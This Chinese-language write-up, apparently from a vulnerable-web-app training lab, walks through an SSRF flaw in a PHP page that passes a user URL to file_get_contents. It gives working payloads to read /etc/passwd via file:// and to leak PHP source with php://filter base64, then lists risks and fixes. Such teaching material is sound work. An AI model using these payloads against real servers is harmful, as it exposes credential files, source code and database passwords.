> 区别上一关`ssrf_curl`：本关后端使用 **`file_get_contents()`**，不是 curl。
> 参数依旧是 GET 参数 `url`。
> 重点：`file_get_contents` 支持 `php://filter` 伪协议；**不支持 dict://、gopher://**。

## 后端核心源码

```
$url=$_GET['url'];
echo file_get_contents($url);
```

直接把用户传入的 url 交给`file_get_contents`读取内容并输出，形成 SSRF。

点击页面链接原始 URL：

```
ssrf_fgc.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php
```

## payload1：访问外部 http（验证漏洞是否通）

```
https://f0012fbf98204f57ae3bbf2cb76c8bce--8081.ap-shanghai2.cloudstudio.club/vul/ssrf/ssrf_fgc.php?url=https://www.baidu.com
```

页面输出百度 HTML，证明 SSRF 生效。

## payload2：file:// 读取 Linux 本地文件

```
.../ssrf_fgc.php?url=file:///etc/passwd
```

## payload3【本关特色，重点】php://filter 读取 PHP 源码

> 
> curl 不支持这个方式，`file_get_contents`可以使用 filter 读取 php 文件源码，**base64 编码读取，不会执行 PHP，拿到源代码**。
> 读取同目录下 ssrf_fgc.php 自己源码：

```
https://f0012fbf98204f57ae3bbf2cb76c8bce--8081.ap-shanghai2.cloudstudio.club/vul/ssrf/ssrf_fgc.php?url=php://filter/read=convert.base64-encode/resource=ssrf_fgc.php
```

访问后页面返回一串 base64 编码字符串，复制全部字符串，在线 base64 解码，就能看到完整 PHP 源代码。

> 
> 也可以读取其他 php 文件，例如：
> `url=php://filter/read=convert.base64-encode/resource=../xxe/xxe_1.php`

## 能力对比 ssrf_curl VS ssrf_fgc

表格

| 关卡 | 函数 | 支持协议 |
| --- | --- | --- |
| ssrf_curl.php | curl_exec() | http/https、file://、dict://、gopher:// |
| ssrf_fgc.php | file_get_contents() | http/https、file://、php://filter；**不支持 dict/gopher** |

> 
> 注意：`file_get_contents` 不能用 dict 做端口扫描，这是和 curl 版本最大区别。

## 漏洞风险

1. 服务器发起请求访问外网、内网 web 服务
2. `file://`读取本地敏感文件
3. `php://filter`读取网站 PHP 源代码，泄露源码、数据库账号密码。

## 修复方案

1. 设置白名单，仅允许`http:// https://`；禁止`file:// php://`等伪协议。
2. 过滤内网 IP 地址（127.0.0.1、10、172.16‑31、192.168 段），禁止访问内网。
3. 设置超时时间，防止 Dos。